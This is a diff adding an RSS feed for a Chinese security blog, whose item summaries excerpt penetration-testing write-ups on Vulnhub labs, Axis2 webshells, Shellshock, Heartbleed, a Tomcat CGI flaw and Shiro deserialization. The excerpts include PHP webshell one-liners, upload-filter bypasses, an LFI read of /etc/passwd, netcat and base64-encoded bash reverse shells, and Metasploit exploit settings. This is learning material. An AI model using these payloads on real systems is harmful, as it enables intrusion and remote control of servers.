@@ -1,0 +1,229 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Vampire blog</title>
+    <link>https://vampire-lab.github.io/</link>
+    <description>Recent content on Vampire blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-CN</language>
+    <copyright>© Copyright notice</copyright>
+    <lastBuildDate>Sun, 19 Apr 2020 21:37:58 +0530</lastBuildDate>
+    
+	<atom:link href="https://vampire-lab.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>About</title>
+      <link>https://vampire-lab.github.io/about/</link>
+      <pubDate>Sun, 19 Apr 2020 21:37:58 +0530</pubDate>
+      
+      <guid>https://vampire-lab.github.io/about/</guid>
+      <description>一只不断老去的安全菜鸟,欢迎交流,共同进步🙂</description>
+    </item>
+    
+    <item>
+      <title>Relativity</title>
+      <link>https://vampire-lab.github.io/posts/relativity/</link>
+      <pubDate>Fri, 29 Nov 2019 12:25:32 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/relativity/</guid>
+      <description>靶机介绍 该靶机的目标为读取/root/flag.txt文件，也是boot2root类型靶机。 靶机下载地址 https://download.vulnhub.com/devrandom/relativity_1.0.1.zip
+靶机运行 下载完成后，直接使用VMware虚拟机打开即可，可能需要修改一下网络配置，这边修改为NAT模式，方面配置网络。
+信息收集 首先使用nmap查找一下靶机地址，我习惯使用-sn 或者-sP，在网段中只判断存活，确认靶机地址为10.10.10.144
+root@kali:~# nmap -sP 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-06 23:31 EST Nmap scan report for 10.10.10.1 Host is up (0.00027s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.000095s latency). MAC Address: 00:50:56:E3:59:BE (VMware) Nmap scan report for 10.10.10.144 Host is up (0.00028s latency). MAC Address: 00:0C:29:17:89:4F (VMware) Nmap scan report for 10.10.10.254 Host is up (0.</description>
+    </item>
+    
+    <item>
+      <title>Drunk_admin_hacking_challenge</title>
+      <link>https://vampire-lab.github.io/posts/drunk_admin_hacking_challenge/</link>
+      <pubDate>Mon, 04 Nov 2019 21:37:38 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/drunk_admin_hacking_challenge/</guid>
+      <description>靶机介绍 该靶机获取隐藏信息类型的靶机，最终目的获取到一个坐标地址，不需要提权（我也没尝试去提权）。 靶场地址 https://download.vulnhub.com/drunkadminhackingchallenge/drunk_admin_hacking_challenge.zip
+靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 查看存活地址 nmap -sn 10.10.10.*
+靶机ip地址为 10.10.10.131 探测开放端口 nmap -p- -sV 10.10.10.131
+开放的端口为22,8880 使用浏览器访问8880 http://10.10.10.131:8880/
+存在上传点 先看看其他信息，点击info
+没有什么有用的信息，下面的PHP点击会跳转到PHPinfo的地址
+http://10.10.10.131:8880/myphp.php?id=102 http://10.10.10.131:8880/myphp.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 尝试遍历id参数0-999
+都是PHPinfo信息
+漏洞利用 上传点利用 尝试利用上传点，先上传一个普通的图片
+上传完成获得一个跳转的数据包
+得到图片地址 http://10.10.10.131:8880/images/72f2517fb0057efa7751d3eb59aa09b6.jpeg
+看到图片名和上个包的cookie中trypios字段相同
+上传木马尝试 首先将正常图片的后缀改成php
+有后缀限制 随便输入一个不存在的后缀名
+可能为白名单限制，继续尝试 在原有的图片后缀名上添加其他后缀内容如后面加.php
+上传成功，可能代码只判断字符串中是否存在jpg等图片格式的字符串 上传小马 失败了，不知道是对文件头进行判断，还是文件内容 尝试随便上传内容
+上传成功，访问上面md5值拼接的地址
+不能访问，可能是对木马中的某个关键字进行了限制 删除每一个字符串，尝试 删除system，上传不成功 删除$_GET，尝试上传 上传成功，看起来是_GET被加入到了黑名单 更改木马内容为 &amp;lt;?php system($_REQUEST[&#39;cmd&#39;])?&amp;gt; 上传成功但是木马不能执行 换个其他内容的木马继续尝试
+上传成功 尝试访问执行木马 http://10.10.10.131:8880/images/a4542f500872cc8a1a2de81a64a889a8?cmd=whoami
+获取信息 反弹shell 靶机上存在nc工具，直接使用nc进行反弹 命令为
+本地开启端口进行监听 nc -lvvp 8080 远程执行命令 nc -c /bin/sh 10.</description>
+    </item>
+    
+    <item>
+      <title>vulnhub: WALKTHROUGH: 21LTR_SCENE_1</title>
+      <link>https://vampire-lab.github.io/posts/21ltr_scene_1/</link>
+      <pubDate>Mon, 04 Nov 2019 20:48:28 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/21ltr_scene_1/</guid>
+      <description>靶机介绍 这是一个很老的靶机了，也是boot2root类型靶机，由于年代久远，我以为会很简单，但是感觉还是自己练习的比较少。。。 靶机下载地址： https://www.vulnhub.com/entry/21ltr-scene-1,3/
+靶机运行 下载完成后，使用VMware虚拟机安装镜像，虚拟机无法检测此光盘镜像中的操作系统，手动选择系统选Ubuntu就好，安装完成后会显示靶机地址为192.168.2.120，看起来不能更改
+不通的话只能手动修改虚拟机配置了，由于靶机练习不需要上网，直接使用仅主机模式就好，在选之前需要配置一下虚拟机的网卡设置，选择编辑点击虚拟网络编辑器
+点击更改设置将子网IP改为192.168.2.0，这样同样使用仅主机的虚拟机就可以互相通信了
+信息收集 首先拿出nmap，扫描一下端口 nmap -p 1-65535 192.168.2.120 得到结果(运气好可能会发现其他端口)
+先访问80看看有什么东西
+没看出来什么。。。没事查看一下源码吧
+拿到密码，登录尝试发现密码为FTP服务账号密码，登录查看内容
+点击查看该文件内容
+看起来是个写错误日志的文件，查看一下源码
+暂时不知道有什么用 还是先扫扫目录吧 直接使用dirb http://192.168.2.120
+发现logs路径，把刚才发现的php文件名拼接访问一下试试 http://192.168.2.120/logs/backup_log.php
+漏洞利用 思路大概可能是想办法将木马写入到日志文件中，但是不知道怎么继续。。查了一下别人的做法，需要向10001端口发送数据，可是为什么我扫描不到这个端口。 仔细查看了一下日志发现有个目标地址192.168.2.240，先把自己的靶机配置为该地址 使用命令临时配置IP，ifconfig eth0 192.168.2.240 netmask 255.255.255.0，图形化界面的kali可能需要在网络配置处更改一下ip
+前面都准备好了，那就拿出wireshark抓包监听吧，等了好久好久（可能我刚好错过时间），发现192.168.2.120服务器会向192.168.2.240的10000端口发送数据
+可能是定时任务，开启nc -lkvvp 10000进行监听，等待继续抓包，又等了好久好久发现每隔十分钟就会向192.168.2.240服务器发送数据
+看到收到数据包，不知道是些什么东西
+迅速开启nmap全端口扫描，啊。。。终于抓到你了
+这会使用nc 或者telnet进行连接192.168.2.120 的10001端口 这个时候刚好10001端口开放直接使用 telnet 192.168.2.120 10001端口，连接成功后输入&amp;lt;?php system($_GET[&#39;cmd&#39;]) ?&amp;gt;,然后回车就会写入到文件中 如果刚好错过了端口开放的时间，为了不需要一直盯着靶机看，可以使用nc -lvvp 10000 &amp;gt; file &amp;amp;&amp;amp; nc -nv 192.168.2.120 10001&amp;lt; 1.txt 这个命令 1.txt里面保存的是小马
+等待十分钟= =
+收到数据包，查看ftp://192.168.2.120/backup_log.php的源码文件,写入成功
+访问http://192.168.2.120/logs/backup_log.php?cmd=id
+获取反弹shell 首先使用 nc -nvlp 8080 然后访问http://192.</description>
+    </item>
+    
+    <item>
+      <title>Php_include_and_post_exploitation</title>
+      <link>https://vampire-lab.github.io/posts/php_include_and_post_exploitation/</link>
+      <pubDate>Mon, 04 Nov 2019 19:42:14 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/php_include_and_post_exploitation/</guid>
+      <description>靶机介绍 这个是个关于php include漏洞的老靶机，学习学习巩固一下基础
+下载地址 https://download.vulnhub.com/pentesterlab/php_include_and_post_exploitation_i386.iso
+靶机运行 直接新建虚拟机，将iso文件加载光盘镜像文件处，直接运行虚拟机就好了
+信息收集 看起来这个题只有web，而且靶机不需要密码，执行ifconfig命令查看靶机IP 直接访问http://10.10.10.140 随便点点看，看题目应该是有文件包含漏洞 访问http://10.10.10.140/index.php?page=submit，发现存在上传和注册功能
+访问http://10.10.10.140/index.php?page=faq，报错了，看起来page存在文件包含漏洞，而且应用会自动拼接.php后缀
+漏洞利用 访问http://10.10.10.140/index.php?page=/etc/passwd尝试读取/etc/passwd，应用拼接了.php但是找到文件产生了报错
+使用%00截断尝试一下，访问http://10.10.10.140/index.php?page=/etc/passwd%00，成功读取文件
+尝试是否存远程文件包含，访问http://10.10.10.140/index.php?page=http://www.baidu.com，返回allow_url_include=0表示未开启该功能
+确认存在文件包含漏洞，去尝试注册上传功能，目前看来应该是上传木马文件使用文件包含漏洞执行代码 在注册处上传一个正常的pdf文件，注册后登陆，注册成功会直接跳转到首页，然后点击login尝试登陆 点击上传文件，跳转到http://10.10.10.140/uploads/20190917081711341.pdf 访问http://10.10.10.140/uploads/，发现上传的文件都可以直接访问 我们来尝试上传一个pdf后缀的木马文件
+root@kali:~# cat 2.pdf &amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]) ?&amp;gt; 会产生报错
+使用head -5 xxx.pdf 获取真实pdf文件头，将文件头添加到木马前面，绕过限制
+root@kali:~# head -5 /root/Downloads/20190917081711341.pdf &amp;gt; 1.pdf root@kali:~# cat 1.pdf %PDF-1.5 %���� 1 0 obj &amp;lt;&amp;lt;/Type/Catalog/Pages 2 0 R/Lang(zh-CN) &amp;gt;&amp;gt; endobj root@kali:~# cat 2.php &amp;gt;&amp;gt; 1.pdf root@kali:~# cat 1.pdf %PDF-1.5 %���� 1 0 obj &amp;lt;&amp;lt;/Type/Catalog/Pages 2 0 R/Lang(zh-CN) &amp;gt;&amp;gt; endobj &amp;lt;?</description>
+    </item>
+    
+    <item>
+      <title>Axis2弱口令渗透测试</title>
+      <link>https://vampire-lab.github.io/posts/axis2%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Mon, 04 Nov 2019 19:34:07 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/axis2%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+      <description>故事背景 发现一个Tomcat服务器 使用dirsearch 扫描查看存在的目录 dirsearch -u xxx -e *
+发现存在/axis2/axis2-admin/路径 访问http://10.xxx.xxx.158:18089/axis2/axis2-admin/
+漏洞发现 访问axis2登录页面，尝试默认口令登录admin:axis2,登录成功 漏洞利用 找到上传点，axis2可上传.aar格式木马 访问 http://10.xxx.xxx.158:18089/axis2/axis2-admin/listService 找到木马访问路径
+木马下载地址 https://github.com/Svti/Axis2Shell axis2 web shell使用介绍：
+1、命令执行 http://1.1.1.1/services/config/exec?cmd=whoami (不说了，执行命令。注意:xml换行没有处理好) 2、反弹shell http://1.1.1.1/services/config/shell?host=1.1.1.1&amp;amp;port=5555 (Linux则使用bash反弹shell，Windows则会进行socket执行shell) 文件上传 http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp (会把resource目录下面的one.txt 写成shell.jsp，注意：全路径，带*文件名) 文件下载 http://1.1.1.1/services/config/download?url=http://www.ooo.com/mm.txt&amp;amp;path=/opt/tomcat/webapps/ROOT/shell.jsp (会把这个URL的文件写成shell.jsp，注意：全路径，带*文件名) 5、class目录查看 http://1.1.1.1/services/config/getClassPath (会显示当前class的路径，方便文件上传) 构造木马访问连接 http://10.xxx.xxx.158:18089/axis2/services/config/exec?cmd=pwd
+漏洞利用（msf方法） 该漏洞也可以使用msf利用模块 exploit/multi/http/axis2_deployer 查看配置show options
+set RHOST xxxxxxxx set RPORT xxxx 然后设置payload set payload java/meterpreter/reverse_tcp 设置监听服务器地址 set LHOST xxxxx 设置监听端口 set LPORT xxxxx
+执行exploit命令，反弹成功</description>
+    </item>
+    
+    <item>
+      <title>密码修改逻辑漏洞-前端验证</title>
+      <link>https://vampire-lab.github.io/posts/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/</link>
+      <pubDate>Mon, 04 Nov 2019 18:57:48 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81/</guid>
+      <description>背景故事 今天上线测试发现了一个只有前端验证的修改密码逻辑漏洞，但是该应用根本没有对验证码进行验证。 访问测试地址http://xxx.xxx.xxx.xxx:xxx/dss，查看页面功能，发现存在找回密码功能。 漏洞发现 点击找回密码功能，输入内容后发现前端验证，未向后端发送数据包 从验证码入手，看看发送验证码的情况 发现点击发送没有时间限制，但是不能指定电话号码，所以不知道是否真的有短信发送 点击确定，向服务器发起获取验证码请求
+POST /dss/findPwd.e HTTP/1.1 Host: xxx.xxx.xxx.xxx:xxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://xxx.xxx.xxx.xxx:xxx/dss/findPwd.jsp Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 7 Connection: close Cookie: JSESSIONID=14CEE8646A9BF274394F948BE24D5ED5 id=test 放过请求找回test账号，返回200，没有数据内容 再尝试请求一个错误的账号，返回内容中疑似存在验证码，但是该验证码不能成功重置密码 上面数据包根据返回内容不同，也可用来爆破存在的用户名
+漏洞验证 既然是前端验证，我们通过使用开发者工具箱找到前端验证的函数 查看找到的函数内容
+function checkform() { $(&amp;#34;#checkResult&amp;#34;).html(&amp;#39;&amp;#39;); var checkResultMes = &amp;#39;请输入的用户账号!&amp;#39;; var findPwdNumber = $(&amp;#39;#findPwdNumber&amp;#39;).val(); if(!findPwdNumber||$.trim(findPwdNumber)==&amp;#39;&amp;#39;) { //验证手机号为11位 $(&amp;#34;#checkResult&amp;#34;).html(checkResultMes); return false; } return true; } //验证输入的手机号是否存在 function getRand(){ if(checkform()){ var findPwdNumber = $(&amp;#39;#findPwdNumber&amp;#39;).</description>
+    </item>
+    
+    <item>
+      <title>破壳漏洞利用与修复（shellshock CVE 2014 6271）</title>
+      <link>https://vampire-lab.github.io/posts/%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BF%AE%E5%A4%8Dshellshock-cve-2014-6271/</link>
+      <pubDate>Mon, 04 Nov 2019 18:38:19 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BF%AE%E5%A4%8Dshellshock-cve-2014-6271/</guid>
+      <description>环境安装 由于工作环境中一台Redhat 5.5 服务器上存在破壳漏洞（CVE-2014-6271）漏洞，相关漏洞资料中只影响到bash 4.3版本，但是升级到bash 4.4版本漏洞还是可以利用成功。于是在本地安装一台Redhat 5.5 并配置Apache httpd cgi，在安装系统过程中选择支持web服务就可以在运行系统之后直接启用httpd服务。
+安全好之后发现Redhat 5.5 的httpd 默认支持cgi功能，如果不支持可以自己手动更改/etc/httpd/conf/httpd.conf内容，如下
+去掉 AddHandler cgi-script .cgi 前面的注释
+部分教程提示还需要将如下内容去掉注释
+然后将cgi脚本放入到/var/www/cgi-bin/目录下，保存为test-cgi文件，内容如下
+#!/bin/sh  # disable filename globbing set -f echo &amp;#34;Content-type: text/plain; charset=iso-8859-1&amp;#34; echo echo CGI/1.0 test script report: echo echo argc is $#. argv is &amp;#34;$*&amp;#34;. echo echo SERVER_SOFTWARE = $SERVER_SOFTWARE echo SERVER_NAME = $SERVER_NAME echo GATEWAY_INTERFACE = $GATEWAY_INTERFACE echo SERVER_PROTOCOL = $SERVER_PROTOCOL echo SERVER_PORT = $SERVER_PORT echo REQUEST_METHOD = $REQUEST_METHOD echo HTTP_ACCEPT = &amp;#34;$HTTP_ACCEPT“ echo PATH_INFO = &amp;#34;$PATH_INFO&amp;#34; echo PATH_TRANSLATED = &amp;#34;$PATH_TRANSLATED&amp;#34; echo SCRIPT_NAME = &amp;#34;$SCRIPT_NAME&amp;#34; echo QUERY_STRING = &amp;#34;$QUERY_STRING&amp;#34; echo REMOTE_HOST = $REMOTE_HOSTecho REMOTE_ADDR = $REMOTE_ADDRecho REMOTE_USER = $REMOTE_USERecho AUTH_TYPE = $AUTH_TYPEecho CONTENT_TYPE = $CONTENT_TYPEecho CONTENT_LENGTH = $CONTENT_LENGTH千万记住上传的文件不要使用Windows换行符&amp;rdquo;/r/n&amp;rdquo;，会报错的。。。</description>
+    </item>
+    
+    <item>
+      <title>Openssl Heartbleed漏洞利用与修复</title>
+      <link>https://vampire-lab.github.io/posts/openssl-heartbleed%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BF%AE%E5%A4%8D/</link>
+      <pubDate>Mon, 04 Nov 2019 18:10:31 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/openssl-heartbleed%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BF%AE%E5%A4%8D/</guid>
+      <description>Heartbleed漏洞简介 Heartbleed漏洞是openssl的漏洞，这个漏洞（CVE-2014-0160）的产生是由于没有在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存中，这样一来受害者的内存内容就会以每次64K的速度进行泄露。
+心跳功能介绍 正常情况下要使SSL发挥作用，需要与服务器进行通信，所以它会发送一个“heartbeat”（心跳）包，通过包内的特定信号，进行判断服务器是否存活，服务器就会向计算机返回该信号，让服务器确保安全通信。而且计算机和服务器之间会定期发送hearbeat以确定用户和服务器没有脱机。
+漏洞原理 该漏洞主要问题出在heartbeat心跳检测的扩展中，在源码d1_both.c中，找到如下代码
+#ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = &amp;amp;s-&amp;gt;s3-&amp;gt;rrec.data[0], *pl; unsigned short hbtype; unsigned int payload; unsigned int padding = 16; 指针p指向一条SSLv3结构体中的数据，结构体SSL3_RECORD的定义如下： 代码段1
+typedef struct ssl3_record_st { int type; unsigned int length; unsigned int off; unsigned char *data; unsigned char *input; unsigned char *comp; unsigned long epoch; unsigned char seq_num[8]; } SSL3_RECORD; 其中type为心跳包的类型，length为数据长度，data为数据正文
+代码段2
+hbtype = *p++; n2s(p, payload); pl = p; 首先获取type的心跳包的类型，类型有两种TLS1_HB_REQUEST和TLS1_HB_RESPONSE，然后使用宏n2s从指针p指向的数组中取出前两个字节，并把它们存入变量payload中，最后将变量pl指向由访问者提供的心跳包数据。</description>
+    </item>
+    
+    <item>
+      <title>CVE 2019 0232 Tomcat远程代码执行漏洞</title>
+      <link>https://vampire-lab.github.io/posts/cve-2019-0232-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Mon, 04 Nov 2019 16:32:00 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/cve-2019-0232-tomcat%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+      <description>漏洞简介 该漏洞只存在于Windows下安装Apache Tomcat 9.0.0.M1 to 9.0.17、Apache Tomcat 8.5.0 to 8.5.39、Apache Tomcat 7.0.0 to 7.0.93 的Tomcat，由于使用enableCmdLineArguments在Windows上运行时，远程执行代码漏洞（CVE-2019-0232）驻留在公共网关接口（CGI）Servlet中，java运行时环境（JRE）将命令行参数传递给Windows的方式存在缺陷导致。但是默认情况下禁用了CGI Servlet，并且在Tomcat 9.0.x中默认情况下禁用了其选项enableCmdLineArguments，因此远程代码执行漏洞被评为中危。
+配置环境 要想复现环境需要修改tomcat安装目录中conf目录下的web.xml，内容如下
+还需要将servlet-mapping中的注释去掉，内容如下
+最后将conf文件夹下的context.xml中context元素添加设置privileged=&amp;quot;true&amp;rdquo;，内容如下
+修改完成配置，然后在webapps下创建一个新的文件夹，并且在文件中新建一个WEB-INF文件夹，其中再创建一个cgi-bin目录，将xxx.bat文件写入到cgi-bin目录下，内容如下
+上述内容完成后，进入Tomcat的bin目录下，运行startup.bat，访问http://127.0.0.1:8080/
+成功，尝试访问我们创建的xxx.bat文件
+证明访问成功，文件存在。
+漏洞验证 使用poc进行测试 http://127.0.0.1:8080/test/cgi-bin/test.bat?&amp;amp;C%3a%5cwindows%5csystem32%5cipconfig
+必须使用URL编码进行访问
+返回结果如下
+利用成功
+也可以使用GitHub上的python脚本进行测试，需要修改url_dir为自己的cgi文件位置。 https://github.com/jas502n/CVE-2019-0232/blob/master/CVE-2019-0232.py</description>
+    </item>
+    
+    <item>
+      <title>vulnhub: Tr0ll</title>
+      <link>https://vampire-lab.github.io/posts/tr0ll/</link>
+      <pubDate>Sun, 03 Nov 2019 16:51:55 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/tr0ll/</guid>
+      <description>靶机介绍 该靶机类型为boot2root，最终目标获取root并且从/root目录中获取proof.txt。
+下载地址
+https://download.vulnhub.com/tr0ll/Tr0ll.rar 靶机运行 直接下载解压，使用VMware虚拟机打开即可，根据自己需求修改网络连接模式
+信息收集 探测靶机地址 nmap -sn 10.10.10.*
+root@kali:~# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-22 21:23 EDT Nmap scan report for 10.10.10.1 Host is up (0.00042s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00027s latency). MAC Address: 00:50:56:E3:59:BE (VMware) Nmap scan report for 10.10.10.143 Host is up (0.00019s latency). MAC Address: 00:0C:29:66:79:D0 (VMware) Nmap scan report for 10.</description>
+    </item>
+    
+    <item>
+      <title>shiro反序列化漏洞复现</title>
+      <link>https://vampire-lab.github.io/posts/my-first-blog/</link>
+      <pubDate>Sun, 03 Nov 2019 09:39:38 +0800</pubDate>
+      
+      <guid>https://vampire-lab.github.io/posts/my-first-blog/</guid>
+      <description>框架简介 Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。(百度百科)
+漏洞原理 由于shiro使用rememberMe这个cookie字段对用户进行权限判断，为了防止出现越权问题，框架使用了CookieRemembreMeManager这个类，使用这个类对cookie中的rememberMe字段进行序列化，然后将其进行aes加密，最后使用base64对其编码，再返回给用户，由于shiro将aes的密钥硬编码在代码中，只要通过调试代码获取到了密钥进行解密，就可以使用ysoserial包进行反序列化操作，生成带有远程代码执行的rememberMe字段值进行漏洞利用。
+环境搭建 测试使用的环境是
+https://github.com/Medicean/VulApps/ 靶机地址和文件路径
+https://github.com/Medicean/VulApps/tree/master/s/shiro/1 VulApps/s/shiro/1 运行命令获取并启动靶机环境
+docker pull medicean/vulapps:s_shiro_1 docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 使用命令查看靶机是否启动成功
+docker container ls 靶机启动成功，访问靶机，端口被映射成80，直接访问 http://xxx.xxx.xxx.xxx
+漏洞复现 利用代码执行反弹shell获取权限 开启nc进行监听
+nc -k -lvvp 8080 使用ysoserial生成相关payload 下载ysoserial
+https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar 运行命令建立监听端口和相关命令
+java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1443 CommonsCollections4 &amp;#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzUvODA4MCAwPiYx}|{base64,-d}|{bash,-i}&amp;#39; 监听端口这里设置为1443，该端口可以随意设置 其中base64部分内容为
+bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.135/8080 0&amp;gt;&amp;amp;1 其内容为需要shell反弹到的目的IP和端口，也就是上面运行nc监听的服务器和端口号 然后运行生成rememberMe字段的脚本工具
+import sys import uuid import base64 import subprocess from Crypto.Cipher import AES def encode_rememberme(command): popen = subprocess.</description>
+    </item>
+    
+  </channel>
+</rss>
